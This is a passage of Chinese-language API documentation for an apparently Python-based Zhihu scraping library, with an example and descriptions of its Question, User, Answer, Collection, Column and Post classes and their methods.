\u8f93\u51fa\u8be5\u4f5c\u8005\u56de\u7b54\u8fc7\u7684\u6240\u6709\u95ee\u9898\u7684\u6807\u9898\n    for answer in user_answers:\n        print answer.get_question().get_title()\n    # \u5f97\u5230\u8be5\u7528\u6237\u7684\u6240\u6709\u6536\u85cf\u5939\n    user_collections = user.get_collections()\n    for collection in user_collections:\n\t# \u8f93\u51fa\u6bcf\u4e00\u4e2a\u6536\u85cf\u5939\u7684\u540d\u5b57\n        print collection.get_name()\n\t# \u5f97\u5230\u8be5\u6536\u85cf\u5939\u4e0b\u7684\u524d\u5341\u4e2a\u56de\u7b54\n        top_answers = collection.get_top_i_answers(10)\n\t# \u628a\u7b54\u6848\u5185\u5bb9\u8f6c\u6210txt\uff0cmarkdown\n        for answer in top_answers:\n            answer.to_txt()\n            answer.to_md()\n\n\u4ee5\u4e0a\u793a\u4f8b\u5747\u53ef\u4ee5\u5728test.py\u6587\u4ef6\u4e2d\u627e\u5230\u3002\n\n\u867d\u7136\u662f\u5355\u7ebf\u7a0b\uff0c\u4f46\u901f\u5ea6\u4e0d\u7b97\u592a\u6162\u3002\u6293\u53d6 `\u54ea\u4e9b\u4e1c\u897f\u4e70\u4e86\u4e4b\u540e\uff0c\u4f1a\u8ba9\u4eba\u56e0\u751f\u6d3b\u8d28\u91cf\u548c\u5e78\u798f\u611f\u63d0\u5347\u800c\u611f\u89c9\u76f8\u89c1\u6068\u665a\uff1f <http:\/\/www.zhihu.com\/question\/20840874>`_ \u4e0b\u524d200\u4e2a\u56de\u7b54\uff0c91\u79d2\uff1b\u6293\u53d6 `\u6709\u54ea\u4e9b 100 \u5143\u4ee5\u4e0b\uff0c\u5f88\u5c11\u89c1\u4f46\u9ad8\u5927\u4e0a\u7684\u7269\u4ef6\uff1f <http:\/\/www.zhihu.com\/question\/23054572>`_ \u4e0b\u524d50\u4e2a\u56de\u7b54\uff0c48\u79d2\uff1b\u6293\u53d6 `\u73b0\u5b9e\u53ef\u4ee5\u6709\u591a\u7f8e\u597d\uff1f <http:\/\/www.zhihu.com\/question\/24269892>`_ \u4e0b\u524d200\u4e2a\u56de\u7b54\uff0c69\u79d2\u3002\u751f\u6210\u7684\u6587\u4ef6\u8bf7\u89c1markdown\uff0ctext\u6587\u4ef6\u5939\u3002\u6240\u6709\u533f\u540d\u7528\u6237\u7684\u56de\u7b54\u653e\u5728\u4e00\u4e2a\u6587\u4ef6\u91cc\u9762\u3002\n\n\nAPI\n-------\n\nzhihu.Question ---- \u77e5\u4e4e\u95ee\u9898\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **Question** (*url, title = None*)\n\n Question \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a Question \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u95ee\u9898\u7684 url \uff08\u5982\uff1a         http:\/\/www.zhihu.com\/question\/26611428\uff09\uff0c\u9700\u5305\u542b\u201chttp:\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u95ee\u9898\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 Question \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u95ee\u9898\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\n \n **Parameters**\uff1a\n  * **url** -- \u8be5\u95ee\u9898\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  * **title** -- \u8be5\u95ee\u9898\u7684\u6807\u9898\uff0c\u5b57\u7b26\u4e32\uff0c\u53ef\u9009\n \n **Returns**\uff1a \u4e00\u4e2a Question \u5b9e\u4f8b\u5bf9\u8c61\n \n **get_title** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u7684\u6807\u9898\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u6807\u9898\u7684\u5b57\u7b26\u4e32\n \n **get_detail** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u7684\u8be6\u7ec6\u63cf\u8ff0\u3002\u539f\u95ee\u9898\u7684\u63cf\u8ff0\u53ef\u80fd\u5e26\u6709\u56fe\u7247\u6216\u89c6\u9891\uff0c\u8fd9\u91cc\u5f97\u5230\u7684\u662f\u7eaf\u6587\u5b57\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u8be6\u7ec6\u63cf\u8ff0\u7684\u5b57\u7b26\u4e32\n \n **get_answers_num** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u7684\u56de\u7b54\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u56de\u7b54\u4e2a\u6570\u7684 int \u578b\u6574\u6570\n \n **get_followers_num** ()\n \n  \u5f97\u5230\u5173\u6ce8\u8be5\u95ee\u9898\u7684\u4eba\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u4eba\u6570\u7684 int \u578b\u6574\u6570\n \n **get_topics** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u6240\u5c5e\u7684\u8bdd\u9898\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a list \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u8bdd\u9898\u7684\u5b57\u7b26\u4e32\n  \n  \u6ce8\uff1a\u4ee5\u540e\u53ef\u80fd\u4f1a\u6dfb\u52a0\u4e00\u4e2a Topic \u7c7b\uff0c\u5230\u65f6\u5019\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u8bdd\u9898\u7684 Topic \u7c7b\u5bf9\u8c61\u3002\n \n **get_all_answers** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u7684\u6240\u6709\u56de\u7b54\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u7b54\u6848\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u7b54\u6848\u7684 Answer \u5bf9\u8c61 \n \n **get_top_i_answers** (n)\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u7684\u524d n \u4e2a\u56de\u7b54\u3002\n  \n  **Parameters**\uff1a **n** -- int \u578b\u6574\u6570\n  \n  **Returns**\uff1a \u5305\u542b\u524d n \u4e2a\u7b54\u6848\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u7b54\u6848\u7684 Answer \u5bf9\u8c61\n \n **get_top_answer** ()\n \n  \u5f97\u5230\u76ee\u524d\u6392\u540d\u7b2c\u4e00\u7684\u56de\u7b54\u3002\n \n  **Returns**\uff1a \u4ee3\u8868\u8be5\u7b54\u6848\u7684 Answer \u5bf9\u8c61\n  \n **get_visit_times** ()\n \n  \u5f97\u5230\u8be5\u95ee\u9898\u88ab\u6d4f\u89c8\u6b21\u6570\u3002\u8be5\u65b9\u6cd5\u7531 `@lufo816 <https:\/\/github.com\/lufo816>`_ \u6dfb\u52a0\u3002\n \n  **Returns**\uff1a \u4ee3\u8868\u6d4f\u89c8\u6b21\u6570\u7684 int \u578b\u6574\u6570\n \n\nzhihu.User ---- \u77e5\u4e4e\u7528\u6237\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **User** (*user_url, user_id = None*)\n\n User \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a User \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u7528\u6237\u7684 url \uff08\u5982\uff1a         http:\/\/www.zhihu.com\/people\/egrcc\uff09\uff0c\u9700\u5305\u542b\u201chttp:\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u7528\u6237\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 User \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u7528\u6237\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\n \n **Parameters**\uff1a\n  * **user_url** -- \u8be5\u7528\u6237\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  * **user_id** -- \u8be5\u7528\u6237\u7684 ID \uff0c\u5b57\u7b26\u4e32\uff0c\u53ef\u9009\n  \n **Returns**\uff1a \u4e00\u4e2a User \u5b9e\u4f8b\u5bf9\u8c61\n\n **get_user_id** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u7684ID\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868 ID \u7684\u5b57\u7b26\u4e32\n\n **get_gender** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u7684\u6027\u522b\u3002\n  \n **Returns**\uff1a \u4ee3\u8868 \u6027\u522b \u7684\u5b57\u7b26\u4e32(male\/female)  \n  \n **get_followees_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\u7684\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u4eba\u6570\u7684 int \u578b\u6574\u6570\n \n **get_followers_num** ()\n \n  \u5f97\u5230\u5173\u6ce8\u8be5\u7528\u6237\u7684\u4eba\u7684\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u4eba\u6570\u7684 int \u578b\u6574\u6570\n \n **get_agree_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u83b7\u5f97\u7684\u8d5e\u540c\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u8d5e\u540c\u6570\u7684 int \u578b\u6574\u6570\n \n **get_thanks_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u83b7\u5f97\u7684\u611f\u8c22\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u611f\u8c22\u6570\u7684 int \u578b\u6574\u6570\n\n **get_head_img_url** (scale)\n\n  \u83b7\u53d6\u7528\u6237\u5934\u50cfurl\u3002\u8be5\u65b9\u6cd5\u7531 `@liuwons <https:\/\/github.com\/liuwons>`_ \u6dfb\u52a0\u3002\n\n  **Parameters**\uff1a **scale** int \u578b\u6574\u6570\uff0c\u4ee3\u8868\u5c3a\u5bf8: 1(25\u00d725), 3(75\u00d775), 4(100\u00d7100), 6(150\u00d7150), 10(250\u00d7250)\n\n  **Returns**\uff1a \u5bf9\u5e94\u5c3a\u5bf8\u5934\u50cf\u7684\u56fe\u7247\u94fe\u63a5, \u5b57\u7b26\u4e32\n \n **get_asks_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u63d0\u95ee\u9898\u7684\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u95ee\u9898\u6570\u7684 int \u578b\u6574\u6570 \n \n **get_answers_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u56de\u7b54\u95ee\u9898\u7684\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u95ee\u9898\u6570\u7684 int \u578b\u6574\u6570 \n \n **get_collections_num** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u6536\u85cf\u5939\u7684\u4e2a\u6570\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u6536\u85cf\u5939\u6570\u7684 int \u578b\u6574\u6570 \n \n **get_followees** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u8be5\u7528\u6237\u5173\u6ce8\u7684\u4eba\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u7528\u6237\u7684 User \u5bf9\u8c61\n \n **get_followers** ()\n \n  \u5f97\u5230\u5173\u6ce8\u8be5\u7528\u6237\u7684\u4eba\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u5173\u6ce8\u8be5\u7528\u6237\u7684\u4eba\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u7528\u6237\u7684 User \u5bf9\u8c61\n \n **get_asks** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u63d0\u7684\u6240\u6709\u95ee\u9898\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u95ee\u9898\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u95ee\u9898\u7684 Question \u5bf9\u8c61\n \n **get_answers** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u56de\u7b54\u7684\u6240\u6709\u95ee\u9898\u7684\u7b54\u6848\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u56de\u7b54\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u56de\u7b54\u7684 Answer \u5bf9\u8c61\n \n **get_collections** ()\n \n  \u5f97\u5230\u8be5\u7528\u6237\u7684\u6240\u6709\u6536\u85cf\u5939\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u6536\u85cf\u5939\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u6536\u85cf\u5939\u7684 Collection \u5bf9\u8c61\n \n\nzhihu.Answer ---- \u77e5\u4e4e\u56de\u7b54\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **Answer** (*answer_url, question = None, author = None, upvote = None, content = None*)\n\n Answer \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a Answer \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u56de\u7b54\u7684 url \uff08\u5982\uff1a         http:\/\/www.zhihu.com\/question\/19878575\/answer\/14776495\uff09\uff0c\u9700\u5305\u542b\u201chttp:\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u56de\u7b54\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 Answer \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u56de\u7b54\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u4e00\u822c\u4e0d\u81ea\u5df1\u521b\u5efaAnswer\u5bf9\u8c61\u3002\n \n **Parameters**\uff1a\n  * **answer_url** -- \u8be5\u7b54\u6848\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  * **question** -- \u8be5\u7b54\u6848\u56de\u7b54\u7684\u95ee\u9898\uff0c Question \u5bf9\u8c61\uff0c\u53ef\u9009\n  * **author** -- \u8be5\u7b54\u6848\u7684\u4f5c\u8005\uff0c User \u5bf9\u8c61\uff0c\u53ef\u9009\n  * **upvote** -- \u8be5\u7b54\u6848\u83b7\u5f97\u7684\u8d5e\u540c\u6570\uff0c int \u578b\u6574\u6570\uff0c\u53ef\u9009\n  * **content** -- \u8be5\u7b54\u6848\u7684\u5185\u5bb9\uff0c BeautifulSoup \u5bf9\u8c61\uff0c\u53ef\u9009\n  \n **Returns**\uff1a \u4e00\u4e2a Answer \u5b9e\u4f8b\u5bf9\u8c61\n\n **get_question** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u56de\u7b54\u7684\u95ee\u9898\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a Question \u5bf9\u8c61\n \n **get_author** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u7684\u4f5c\u8005 \u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a User \u5bf9\u8c61\n \n **get_upvote** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u83b7\u5f97\u7684\u8d5e\u540c\u6570\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a int \u578b\u6574\u6570\n \n **get_content** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u7684\u5185\u5bb9\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a BeautifulSoup \u5bf9\u8c61\n  \n **get_visit_times** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u6240\u5c5e\u95ee\u9898\u88ab\u6d4f\u89c8\u6b21\u6570\u3002\u8be5\u65b9\u6cd5\u7531 `@lufo816 <https:\/\/github.com\/lufo816>`_ \u6dfb\u52a0\u3002\n \n  **Returns**\uff1a \u4ee3\u8868\u6d4f\u89c8\u6b21\u6570\u7684 int \u578b\u6574\u6570\n  \n **get_voters** ()\n \n  \u5f97\u5230\u7ed9\u8be5\u7b54\u6848\u70b9\u8d5e\u7684\u7528\u6237\u3002\u8be5\u65b9\u6cd5\u7531 `@lufo816 <https:\/\/github.com\/lufo816>`_ \u6dfb\u52a0\u3002\n \n  **Returns**\uff1a \u5305\u542b\u6240\u6709\u7ed9\u8be5\u7b54\u6848\u70b9\u8d5e\u7684\u7528\u6237\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u7528\u6237\u7684 User \u5bf9\u8c61\n \n **to_txt** ()\n  \n  \u5c06\u8be5\u7b54\u6848\u8f6c\u6210txt\u6587\u4ef6\uff0c\u5e76\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atext\u6587\u4ef6\u5939\uff0c\u6240\u751f\u6210\u7684txt\u6587\u4ef6\u5747\u4fdd\u5b58\u5728\u8be5\u6587\u4ef6\u5939\u3002\n \n **to_md** ()\n \n  \u5c06\u8be5\u7b54\u6848\u8f6c\u6210markdown\u6587\u4ef6\uff0c\u5e76\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2amarkdown\u6587\u4ef6\u5939\uff0c\u6240\u751f\u6210\u7684markdown\u6587\u4ef6\u5747\u4fdd\u5b58\u5728\u8be5\u6587\u4ef6\u5939\u3002\n\n\nzhihu.Collection ---- \u77e5\u4e4e\u6536\u85cf\u5939\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **Collection** (*url, name = None, creator = None*)\n\n Collection \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a Collection \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u6536\u85cf\u5939\u7684 url \uff08\u5982\uff1a         http:\/\/www.zhihu.com\/collection\/27053469\uff09\uff0c\u9700\u5305\u542b\u201chttp:\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u6536\u85cf\u5939\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 Collection \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u6536\u85cf\u5939\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\n \n **Parameters**\uff1a\n  * **url** -- \u8be5\u6536\u85cf\u5939\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  * **name** -- \u8be5\u6536\u85cf\u5939\u7684\u540d\u5b57\uff0c\u5b57\u7b26\u4e32\uff0c\u53ef\u9009\n  * **creator** -- \u8be5\u6536\u85cf\u5939\u7684\u521b\u5efa\u8005\uff0cUser \u5bf9\u8c61\uff0c\u53ef\u9009\n  \n **Returns**\uff1a \u4e00\u4e2a Collection \u5b9e\u4f8b\u5bf9\u8c61\n\n **get_name** ()\n \n  \u5f97\u5230\u8be5\u6536\u85cf\u5939\u7684\u540d\u5b57\u3002\n  \n  **Returns**\uff1a \u4ee3\u8868\u540d\u5b57\u7684\u5b57\u7b26\u4e32\n \n **get_creator** ()\n \n  \u5f97\u5230\u8be5\u6536\u85cf\u5939\u7684\u521b\u5efa\u8005\u3002\n  \n  **Returns**\uff1a\u4ee3\u8868\u521b\u5efa\u8005 User \u5bf9\u8c61\n \n **get_all_answers** ()\n \n  \u5f97\u5230\u8be5\u6536\u85cf\u5939\u6536\u85cf\u7684\u6240\u6709\u56de\u7b54\u3002\n  \n  **Returns**\uff1a \u5305\u542b\u8be5\u6536\u85cf\u5939\u4e0b\u6240\u6709\u56de\u7b54\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u56de\u7b54\u7684 Answer \u5bf9\u8c61\n \n **get_top_i_answers** (n)\n \n  \u5f97\u5230\u8be5\u6536\u85cf\u5939\u6536\u85cf\u7684\u524d n \u4e2a\u56de\u7b54\u3002\n  \n  **Parameters**\uff1a **n** -- int \u578b\u6574\u6570\n  \n  **Returns**\uff1a \u5305\u542b\u8be5\u6536\u85cf\u5939\u4e0b\u524d n \u4e2a\u56de\u7b54\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u56de\u7b54\u7684 Answer \u5bf9\u8c61\n\n\nzhihu.Column ---- \u77e5\u4e4e\u4e13\u680f\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **Column** (*Column_url*)\n\n Column \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a Column \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u4e13\u680f\u7684 url \uff08\u5982\uff1ahttp:\/\/zhuanlan.zhihu.com\/daily\uff09\uff0c\u9700\u5305\u542b\u201chttp(s):\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u4e13\u680f\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 Column \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u4e13\u680f\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u8be5\u7c7b\u7531 `@johnnyluck <https:\/\/github.com\/johnnyluck>`_ \u6dfb\u52a0\u3002\n \n **Parameters**\uff1a\n  * **column_url** -- \u8be5\u4e13\u680f\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  \n **Returns**\uff1a \u4e00\u4e2a Column \u5b9e\u4f8b\u5bf9\u8c61\n\n **get_title** ()\n \n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u9898\u76ee\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u4ee3\u8868\u9898\u76ee\u7684\u5b57\u7b26\u4e32 \n \n **get_creator** ()\n \n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u521b\u5efa\u8005\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a User \u5bf9\u8c61\n \n **get_description** ()\n \n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u63cf\u8ff0\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u4e13\u680f\u63cf\u8ff0\u7684\u5b57\u7b26\u4e32\n\n **get_followers_num** ()\n\n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u5173\u6ce8\u4eba\u6570\u3002\n\n  **Returns**\uff1a \u4e00\u4e2a int \u578b\u7684\u6574\u6570\n \n **get_posts_num** ()\n\n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u6240\u6709\u6587\u7ae0\u6570\u3002\n\n  **Returns**\uff1a \u4e00\u4e2a int \u578b\u7684\u6574\u6570\n \n **get_content** ()\n \n  \u5f97\u5230\u8be5\u7b54\u6848\u7684\u5185\u5bb9\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u5b57\u7b26\u4e32\n\n **get_posts** ()\n\n  \u5f97\u5230\u8be5\u4e13\u680f\u7684\u6240\u6709\u6587\u7ae0\u3002\n\n  **Returns**\uff1a\u5305\u542b\u6240\u6709\u6587\u7ae0\u7684 generator \u5bf9\u8c61\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e3a\u4ee3\u8868\u4e00\u4e2a\u6587\u7ae0 Post \u5bf9\u8c61\n \n\nzhihu.Post ---- \u77e5\u4e4e\u4e13\u680f\u6587\u7ae0\u64cd\u4f5c\u7c7b\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*class* zhihu. **Post** (*Post_url*)\n\n Post \u4ee5 url \u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u521b\u5efa\u4e00\u4e2a Post \u5bf9\u8c61\u5b9e\u4f8b\u5fc5\u987b\u4f20\u5165\u4e00\u4e2a\u4ee3\u8868\u77e5\u4e4e\u6587\u7ae0\u7684 url \uff08\u5982\uff1ahttp:\/\/zhuanlan.zhihu.com\/p\/20235601\uff09\uff0c\u9700\u5305\u542b\u201chttp(s):\/\/\u201d\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u4ee3\u8868\u6587\u7ae0\u7684 url \uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\u3002\u901a\u8fc7\u8c03\u7528 Post \u7c7b\u7684\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u83b7\u5f97\u8be5\u6587\u7ae0\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u8be5\u7c7b\u7531 `@johnnyluck <https:\/\/github.com\/johnnyluck>`_ \u6dfb\u52a0\u3002\n \n **Parameters**\uff1a\n  * **post_url** -- \u8be5\u6587\u7ae0\u7684\u94fe\u63a5\uff0c\u5b57\u7b26\u4e32\n  \n **Returns**\uff1a \u4e00\u4e2a Post \u5b9e\u4f8b\u5bf9\u8c61\n\n **get_title** ()\n \n  \u5f97\u5230\u8be5\u6587\u7ae0\u7684\u9898\u76ee\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u4ee3\u8868\u9898\u76ee\u7684\u5b57\u7b26\u4e32 \n \n **get_author** ()\n \n  \u5f97\u5230\u8be5\u6587\u7ae0\u7684\u4f5c\u8005\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a User \u5bf9\u8c61\n \n **get_content** ()\n \n  \u5f97\u5230\u8be5\u6587\u7ae0\u7684\u5185\u5bb9\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u6587\u7ae0\u63cf\u8ff0\u7684\u5b57\u7b26\u4e32\n\n **get_topics** ()\n \n  \u5f97\u5230\u8be5\u6587\u7ae0\u7684\u8bdd\u9898\u3002\n  \n  **Returns**\uff1a \u4e00\u4e2a\u5217\u8868\n\n **get_column** ()\n\n  \u5f97\u5230\u8be5\u6587\u7ae0\u7684\u6240\u5c5e\u4e13\u680f\u3002\n\n  **Returns**\uff1a\u4e00\u4e2a Column \u7684\u5b9e\u4f8b\u5bf9\u8c61\n \n\n"}]